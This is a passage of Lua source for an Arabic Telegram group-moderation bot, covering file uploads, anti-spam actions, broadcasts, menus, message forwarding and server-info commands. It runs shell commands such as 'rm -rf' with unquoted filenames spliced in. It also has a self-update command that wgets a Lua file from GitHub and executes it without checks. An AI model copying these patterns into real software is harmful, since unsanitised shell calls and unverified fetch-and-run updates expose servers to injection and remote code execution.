os.execute('rm -rf ./'..ffrr) 
end
function Addsticker(msg,chat,Sd,rre)
local Qw = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..Sd)) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..Qw.result.file_path,rre) 
sendSticker(msg.chat_id_, msg.id_, 0, 1, nil, './'..rre)
os.execute('rm -rf ./'..rre) 
end
function AddFile_Bot(msg,chat,ID_FILE,File_Name)
if File_Name:match('.json') then
if tonumber(File_Name:match('(%d+)')) ~= tonumber(bot_id) then 
send(chat,msg.id_," ♤  ملف نسخه ليس لهاذا البوت")
return false 
end      
local File = json:decode(https.request('https://api.telegram.org/bot'.. token..'/getfile?file_id='..ID_FILE) ) 
download_to_file('https://api.telegram.org/file/bot'..token..'/'..File.result.file_path, ''..File_Name) 
send(chat,msg.id_," ♤  جاري ...\n ♤  رفع الملف الان")
else
send(chat,msg.id_,"* ♤ عذرا الملف ليس بصيغة {JSON} يرجى رفع الملف الصحيح*")
end      
local info_file = io.open('./'..bot_id..'.json', "r"):read('*a')
local groups = JSON.decode(info_file)
for idg,v in pairs(groups.GP_BOT) do
database:sadd(bot_id..'Chek:Groups',idg)  
database:set(bot_id..'lock:tagservrbot'..idg,true)   
list ={"lock:Bot:kick","lock:user:name","lock:hashtak","lock:Cmd","lock:Link","lock:forward","lock:Keyboard","lock:geam","lock:Photo","lock:Animation","lock:Video","lock:Audio","lock:vico","lock:Sticker","lock:Document","lock:Unsupported","lock:Markdaun","lock:Contact","lock:Spam"}
for i,lock in pairs(list) do 
database:set(bot_id..lock..idg,'del')    
end
if v.MNSH then
for k,idmsh in pairs(v.MNSH) do
database:sadd(bot_id..'Constructor'..idg,idmsh)
end
end
if v.MDER then
for k,idmder in pairs(v.MDER) do
database:sadd(bot_id..'Manager'..idg,idmder)  
end
end
if v.MOD then
for k,idmod in pairs(v.MOD) do
database:sadd(bot_id..'Mod:User'..idg,idmod)  
end
end
if v.ASAS then
for k,idASAS in pairs(v.ASAS) do
database:sadd(bot_id..'Basic:Constructor'..idg,idASAS)  
end
end
end
send(chat,msg.id_,"\n ♤ تم رفع الملف بنجاح وتفعيل الجروبات\n ♤ ورفع {الامنشئين الاساسين ; والمنشئين ; والمدراء; والادمنيه} بنجاح")
end
local function trigger_anti_spam(msg,type)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)
local Name = '['..utf8.sub(data.first_name_,0,40)..'](tg://user?id='..data.id_..')'
if type == 'kick' then 
Text = '\n ♤ العضــو  ⇦♤'..Name..'♤\n ♤ قام بالتكرار هنا وتم طرده '  
sendText(msg.chat_id_,Text,0,'md')
chat_kick(msg.chat_id_,msg.sender_user_id_) 
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
return false  
end 
if type == 'del' then 
DeleteMessage(msg.chat_id_,{[0] = msg.id_})    
my_ide = msg.sender_user_id_
msgm = msg.id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
end 
if type == 'keed' then
https.request("https://api.telegram.org/bot" .. token .. "/restrictChatMember?chat_id=" ..msg.chat_id_.. "&user_id=" ..msg.sender_user_id_.."") 
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_) 
msgm = msg.id_
my_ide = msg.sender_user_id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
Text = '\n ♤ العضــو  ⇦♤'..Name..'♤\n ♤ قام بالتكرار هنا وتم تقييده '  
sendText(msg.chat_id_,Text,0,'md')
return false  
end  
if type == 'mute' then
Text = '\n ♤ العضــو  ⇦♤'..Name..'♤\n ♤ قام بالتكرار هنا وتم كتمه '  
sendText(msg.chat_id_,Text,0,'md')
database:sadd(bot_id..'Muted:User'..msg.chat_id_,msg.sender_user_id_) 
msgm = msg.id_
my_ide = msg.sender_user_id_
local num = 100
for i=1,tonumber(num) do
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = {[0] = msgm}},function(arg,data) 
if data.messages_[0] ~= false then
if tonumber(my_ide) == (data.messages_[0].sender_user_id_) then
DeleteMessage(msg.chat_id_, {[0] = data.messages_[0].id_})
end;end;end, nil)
msgm = msgm - 1048576
end
return false  
end
end,nil)   
end  

function chat_list(msg)
local list = redis:smembers(dany..'group:ids')
message = '- **قائمه المجموعات :\n\n'
for k,v in pairs(list) do 
local info = redis:get(dany..'group:name'..v)
if info then 
if utf8.len(info) > 25 then
info = utf8.escape(utf8.gsub(info,0,25))..'...'
end
message = message..k..'ـ '..Flter_Markdown(info).. ' \nــ ⋆⊱ { `' ..v.. '` } ⊰⋆\n\n'
else 
message = message..k.. 'ـ '..' ☜ ⋆⊱ { `' ..v.. '` } ⊰⋆ \n'
end 
end
all_groups = '- قائمه المجموعات :<br><br>'
for k,v in pairs(list) do 
local info = redis:get(dany..'group:name'..v)
if info then
all_groups = all_groups..' '..k..'- <span style="color: #bd2a2a;">'..info.. '</span> <br> ايدي ☜ (<span style="color:#078883;">' ..v.. '</span>)<br>'
else
all_groups = all_groups..' '..k.. '- '..' ☜ (<span style="color:#078883;">' ..v.. '</span>) <br>'
end 
end

if utf8.len(message) > 4096 then
sendMsg(msg.chat_id_,1,'- **عذرا لديك الكثير من المجموعات\n- **سوف ارسل لك ملف فيها قائمه مجموعات المفعله انتظر لحظه ...')
file = io.open("./inc/All_Groups.html", "w")
file:write([[
<html dir="rtl">
<head>
<title>قائمه المجموعات - </title>
<meta content="text/html; charset=UTF-8" http-equiv="Content-Type"/>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link href="https://fonts.googleapis.com/css?family=Harmattan" rel="stylesheet">

</head>
<style>*{font-family: 'Harmattan', sans-serif;font-weight: 600;text-shadow: 1px 1px 16px black;}</style>
<joker>
<p style="color:#018bb6;font-size: 17px;font-weight: 600;" aligin="center">قائمه المجموعات 🗣</p>
<hr>
]]..all_groups..[[

</joker>
</html>
]])
file:close()
return sendDocument(msg.chat_id_,msg.id_,'./inc/All_Groups.html','-♤قائمه المجموعات بالكامله ✓ \n-│يحتوي ('..#list..') مجموعه \n-│افتح الملف في عارض HTML او بالمتصفح',dl_cb,nil)
else 
return sendMsg(msg.chat_id_,1,message) 
end 
end  



function plugin_Dragon(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.Dragon and msg then
pre_msg = plugin.Dragon(msg)
end
end
end
send(msg.chat_id_, msg.id_,pre_msg)  
end
--------------------------------------------------------------------------------------------------------------
function SourceDRAGON(msg,data) -- بداية العمل
if msg then
local text = msg.content_.text_
--------------------------------------------------------------------------------------------------------------
if msg.chat_id_ then
local id = tostring(msg.chat_id_)
if id:match("-100(%d+)") then
database:incr(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) 
Chat_Type = 'GroupBot' 
elseif id:match("^(%d+)") then
database:sadd(bot_id..'User_Bot',msg.sender_user_id_)  
Chat_Type = 'UserBot' 
else
Chat_Type = 'GroupBot' 
end
end
if database:get(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "الغاء" or text == "الغاء ♤" then   
send(msg.chat_id_, msg.id_," ♤ تم الغاء الاذاعه")
database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
local list = database:smembers(bot_id.."Chek:Groups") 
if msg.content_.text_ then
for k,v in pairs(list) do 
send(v, 0,"["..msg.content_.text_.."]")  
database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
sendPhoto(v, 0, photo,(msg.content_.caption_ or ""))
database:set(bot_id..'Msg:Pin:Chat'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
sendDocument(v, 0, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or "")) 
database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
sendSticker(v, 0, msg.content_.sticker_.sticker_.persistent_id_)   
database:set(bot_id..'Msg:Pin:Chat'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
send(msg.chat_id_, msg.id_," ♤ تمت الاذاعه الى *~ "..#list.." ~* كروب ")
database:del(bot_id.."Bc:Grops:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end
------by-harwen-- 
------by-harwen--
if Chat_Type == 'UserBot' then
if not DevSoFi(msg) then
if text == '/start' then  
local bl = 'مرحبا بيك عزيزي العضو اليك الاوامر في الاسفل'
local keyboard = {
{'♤مـطـوريـن الـسـورس♤'},
{'مبرمج تيمو','مبرمج جابوا'},
{'⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺'},
{'مبرمج ابو المجد','مالك عمر'},
{'⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺'},
{'ثيم','بايو','ايدي'},
{'عايز بوت','التواصل'},
{'⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺'},
{'تويت','صراحه'},
{'انصحنى','كتابات'},
{'⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺'},
{'عايز اضحك','نكته'},
{'مطور','انا مين'},
{'⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺'},
{'تعطيل مريم', 'تفعيل مريم',' مريم'},
{'الالعاب'},
{'⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺'},
{'نسبه جمالي','صورتي'},
{'روايات','حروف بالصور'},
{'⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺'},
{'لو خيروك بالصور','تويت بالصور'},
{'لو خيروك'},
{'⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺'},
{'التاريخ','الساعه'},
{'سعر التنصيب'},
{'⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺'},
{'بوستات','باد','حروف'},
{'استوري'},
{'⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺'},
{'يوتيوب'},
{'قصيده','حكمه'},
{'⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺'},
{'غنيلي'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
end
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'الملوك') 
local DRAGON_Msg = { 
' 🔵°اهـــلا انا بـوت اسمــي '..Namebot..' ⛓│آختـصاصـي حمايـه آلمجـموعـات ..🥺\n🔵│ مـن آلسـبآم وآلتوجيه وآلتكرآر وآلخ..\n🚸╽ لتفعيل آلبوت آتبــع الشـروط 😈❕\n↫ ❬اضف البوت الى المجموعه❭\n↫ ❬ارفع البوت ادمن في المجموعه❭\n↫ ❬وارسل تفعيل وسيتم تفعيل البوت ورفع مشرفي الكروب تلقائين ❭',
} 
Namebot = DRAGON_Msg[math.random(#DRAGON_Msg)] 
local msg_id = msg.id_/2097152/0.5  
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = 'الـمـطـور', url="http://t.me/"..sudos.UserName},
},
{
{text = '  أضفہ ألبہوتہ أليہ مہجہمہوعہتہكہ°'   ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"},
},
}
local function getpro(extra, result, success) 
if result.photos_[0] then 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo='..result.photos_[0].sizes_[1].photo_.persistent_id_..'&caption=' .. URL.escape(Namebot).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
else 
send(msg.chat_id_, msg.id_,Namebot, 1, 'md') 
end 
end 
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = bot_id, offset_ = 0, limit_ = 1 }, getpro, nil) 
end
end

if text == "سعر التنصيب" then
if not DevSoFi(msg) then
local Text = [[
♤سعر التنصيب علي سورس الملوك 
♤20 جنيه شهريا 100 سنويا
♤للتواصل اتبع الازرار بالاسفل ⇓
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = ' ♤ 𝒕𝒊𝒎𝒐  ',url="t.me/ttimo_8lby"},{text = ' ♤ 𝒂𝒃𝒐 𝒆𝒍𝒎𝒂𝒈𝒅  ',url="t.me/ABO_ELMAGD2"}},
{{text = ' ♤ 𝒕𝒂W𝒂𝒔𝒐𝒍',url="t.me/tawasol_1_bot"}}, 
{{text = ' ♤ 𝒐𝒎𝒂𝒓  ',url="t.me/teemElmelok"},{text = ' ♤ 𝒎𝒐𝒔𝒕𝒂𝒇𝒂  ',url="t.me/J_A_B_W_A"}},
{{text = '°𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌° ', url="t.me/eLmLoK0"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/timo_019/40&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
end
if text == "عايز سورس" then
if not DevSoFi(msg) then
local Text = [[
┌ سعر السورس عند تيم الملوك
├ السورسات بتبدا من100الي 240ج
├ سعر المصنع200
└ سعر السيرفر ●50,و 4 ب80, 8ب120
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'المبرمج تيمو ♤ ',url="t.me/ttimo_8lby"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/timo_019/40&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
end
if text == 'قـسم الالـعـاب' then
local Text = 'مرحب بيك في قسم الالعاب'
local Key = {
{'⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺ '},
{'مطور','انا مين'},
{'⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺'},
{'انصحنى','كتبات'},
{'⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺'},
{'تويت بالصور','لو خيروك بالصور'},
{'⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺'},
{'صراحه','تويت'},
{'⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺'},
{'حروف','لو خيروك','نكته'},
{'°𝒃𝒂𝒄𝒌°'},
}
send_inline_key(msg.chat_id_,Text,Key)
end 
if text == 'قسم المميزات' then
local Text = 'مميزات خاصه ب اللي منصبين مميزات '
local Key = {
{'⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺'},
{'اغاني','مميزات'},
{'⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺ '},
{'الافلام','العاب'},
{'⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺'},
{'قران','روايات'},
{'⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺'},
{'استوري'},
{'⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺'},
{'ثيم','غنيلي'},
{'°𝒃𝒂𝒄𝒌°'},
}
send_inline_key(msg.chat_id_,Text,Key)
end 

if text == 'قسم مطورين السورس والمبرمجين' then
local Text = ' قسم مطورين السورس لدخول الي حسابتهم'
local Key = {
{'♤مـطـوريـن الـسـورس♤'},
{'التواصل','عايز بوت','يا سورس'},
{'مبرمج تيمو','مبرمج ابو المجد'},
{'مالك عمر','مبرمج جابوا'},
{'°𝒃𝒂𝒄𝒌°'},
}
send_inline_key(msg.chat_id_,Text,Key)
end 

end
end
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'UserBot' then
if text == '/start' or text == 'العوده♤' then  
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' ♤لا تستطيع استخدام البوت يرجى الاشتراك في القناة حتى تتمكن من استخدام الاوامر \n ♤اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if DevSoFi(msg) then
local bl = '♤ اهــلا بـيـك عـزيـزي المــطور اليـك الاوامـر فـي الاسـفل '
local keyboard = {
{'ضع اسم للبوت','معلومات الكيبورد'},
{'المشتركين','الجروبات','الاحصائيات'},
{'⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺'},
{'جلب النسخه'},
{'جلب المطورين','جلب المشتركين','جلب الثانوين'},
{'قسم مطورين السورس والمبرمجين','قــسم مـسح♤اضـف'},
{'قـسم تـفعيل♤تـعطيل','قـسم الـحمايه'},
{'⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺'},
{'قـسم الاذاعـه'},
{'تحديث السورس ','الاصدار'},
{'معلومات السيرفر'},
{'⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺'},
{'الغاء'},
}
send_inline_key(msg.chat_id_,bl,keyboard)
end
end
if not DevSoFi(msg) and not database:sismember(bot_id..'Ban:User_Bot',msg.sender_user_id_) and not database:get(bot_id..'Tuasl:Bots') then
send(msg.sender_user_id_, msg.id_,'  ')
tdcli_function ({ID = "ForwardMessages", chat_id_ = SUDO,    from_chat_id_ = msg.sender_user_id_,    message_ids_ = {[0] = msg.id_},    disable_notification_ = 1,    from_background_ = 1 },function(arg,data) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,ta) 
vardump(data)
if data and data.messages_[0].content_.sticker_ then
local Name = '['..string.sub(ta.first_name_,0, 40)..'](tg://user?id='..ta.id_..')'
local Text = ' ♤تم ارسال الملصق من ⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n - '..Name
sendText(SUDO,Text,0,'md')
end 
end,nil) 
end,nil)
end
if DevSoFi(msg) and msg.reply_to_message_id_ ~= 0  then    
tdcli_function({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)},function(extra, result, success) 
if result.forward_info_.sender_user_id_ then     
id_user = result.forward_info_.sender_user_id_    
end     
tdcli_function ({ID = "GetUser",user_id_ = id_user},function(arg,data) 
if text == 'حظر' then
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ♤المستخدم ⇦♤'..Name..'♤\n ♤تم حظره من التواصل'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
database:sadd(bot_id..'Ban:User_Bot',data.id_)  
return false  
end 
if text =='الغاء الحظر' then
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ♤المستخدم ⇦♤'..Name..'♤\n ♤تم الغاء حظره من التواصل'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
database:srem(bot_id..'Ban:User_Bot',data.id_)  
return false  
end 

tdcli_function({ID='GetChat',chat_id_ = id_user},function(arg,dataq)
tdcli_function ({ ID = "SendChatAction",chat_id_ = id_user, action_ = {  ID = "SendMessageTypingAction", progress_ = 100} },function(arg,ta) 
if ta.code_ == 400 or ta.code_ == 5 then
local DRAGON_Msg = '\n ♤قام الشخص بحظر البوت'
send(msg.chat_id_, msg.id_,DRAGON_Msg) 
return false  
end 
if text then    
send(id_user,msg.id_,text)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ♤المستخدم ⇦♤'..Name..'♤\n ♤تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end    
if msg.content_.ID == 'MessageSticker' then    
sendSticker(id_user, msg.id_, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ♤المستخدم ⇦♤'..Name..'♤\n ♤تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end      
if msg.content_.ID == 'MessagePhoto' then    
sendPhoto(id_user, msg.id_, 0, 1, nil,msg.content_.photo_.sizes_[0].photo_.persistent_id_,(msg.content_.caption_ or ''))    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ♤المستخدم ⇦♤'..Name..'♤\n ♤تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
if msg.content_.ID == 'MessageAnimation' then    
sendDocument(id_user, msg.id_, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ♤المستخدم ⇦♤'..Name..'♤\n ♤تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
if msg.content_.ID == 'MessageVoice' then    
sendVoice(id_user, msg.id_, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_)    
local Name = '['..string.sub(data.first_name_,0, 40)..'](tg://user?id='..id_user..')'
local Text = ' ♤المستخدم ⇦♤'..Name..'♤\n ♤تم ارسال الرساله اليه'
sendText(SUDO,Text,msg.id_/2097152/0.5,'md')
return false
end     
end,nil)
end,nil)
end,nil)
end,nil)
end 
if text == 'تفعيل التواصل ' and DevSoFi(msg) then  
if database:get(bot_id..'Tuasl:Bots') then
database:del(bot_id..'Tuasl:Bots') 
Text = '\n ♤ تم تفعيل التواصل ' 
else
Text = '\n ♤ بالتاكيد تم تفعيل التواصل '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل التواصل ' and DevSoFi(msg) then  
if not database:get(bot_id..'Tuasl:Bots') then
database:set(bot_id..'Tuasl:Bots',true) 
Text = '\n ♤ تم تعطيل التواصل' 
else
Text = '\n ♤ بالتاكيد تم تعطيل التواصل'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل البوت الخدمي ' and DevSoFi(msg) then  
if database:get(bot_id..'Free:Bots') then
database:del(bot_id..'Free:Bots') 
Text = '\n ♤ تم تفعيل البوت الخدمي ' 
else
Text = '\n ♤ بالتاكيد تم تفعيل البوت الخدمي '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل البوت الخدمي ' and DevSoFi(msg) then  
if not database:get(bot_id..'Free:Bots') then
database:set(bot_id..'Free:Bots',true) 
Text = '\n ♤ تم تعطيل البوت الخدمي' 
else
Text = '\n ♤ بالتاكيد تم تعطيل البوت الخدمي'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text and database:get(bot_id..'Start:Bots') then
if text == 'الغاء' or text == 'الغاء' then   
send(msg.chat_id_, msg.id_,' ♤ الغاء حفظ كليشه ستارت')
database:del(bot_id..'Start:Bots') 
return false
end
database:set(bot_id.."Start:Bot",text)  
send(msg.chat_id_, msg.id_,' ♤ تم حفظ كليشه ستارت')
database:del(bot_id..'Start:Bots') 
return false
end
if text == 'اضف رد استارت' and DevSoFi(msg) then 
database:set(bot_id..'Tuasl:Bots',true) 
send(msg.chat_id_, msg.id_,' ♤ ارسل لي رد الان')
return false
end
if text == 'مسح رد استارت' and DevSoFi(msg) then 
database:del(bot_id..'Tuasl:Bots') 
send(msg.chat_id_, msg.id_,' ♤ تم مسح رد استارت')
end
if text == 'ضع كليشه ستارت' and DevSoFi(msg) then 
database:set(bot_id..'Start:Bots',true) 
send(msg.chat_id_, msg.id_,' ♤ ارسل لي الكليشه الان')
return false
end
if text == 'مسح كليشه ستارت' and DevSoFi(msg) then 
database:del(bot_id..'Start:Bot') 
send(msg.chat_id_, msg.id_,' ♤ تم مسح كليشه ستارت')
end
if text == 'معلومات السيرفر' and DevSoFi(msg) then 
send(msg.chat_id_, msg.id_, io.popen([[
linux_version=`lsb_release -ds`
memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
echo '⇗ نظام التشغيل ⇖•\n* '"$linux_version"'*' 
echo '⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n  ♤︙↝ الذاكره العشوائيه ↜  ↚\n* '"$memUsedPrc"'*'
echo '⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n  ♤︙↝ وحـده الـتـخـزيـن ↜  ↚\n* '"$HardDisk"'*'
echo '⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n  ♤︙↝ الـمــعــالــج ↜  ↚\n* '"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'*'
echo '⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n  ♤︙↝ الــدخــول ↜  ↚\n* '`whoami`'*'
echo '⩹━━━⊶❲✧𝒔𝒐𝒖𝒓𝒄𝒆 𝒆𝒍𝒎𝒍𝒐𝒌‌‌‌✧❳⊷━━━⩺\n  ♤︙↝ مـده تـشغيـل الـسـيـرفـر ↜ ↚\n* '"$uptime"'*'
]]):read('*all'))  
end
if text == 'ت ث' and DevSoFi(msg) then 
os.execute('rm -rf DRAGON.lua')
os.execute('wget https://raw.githubusercontent.com/JAPWA/STORM/main/DRAGON.lua')
send(msg.chat_id_, msg.id_,'♤  تم تحديث السورس')
dofile('DRAGON.lua')  
end
if text == 'جلب المشتركين' and DevSoFi(msg) then 
local list = database:smembers(bot_id..'User_Bot') 
local t = '{"users":['   
for k,v in pairs(list) do 
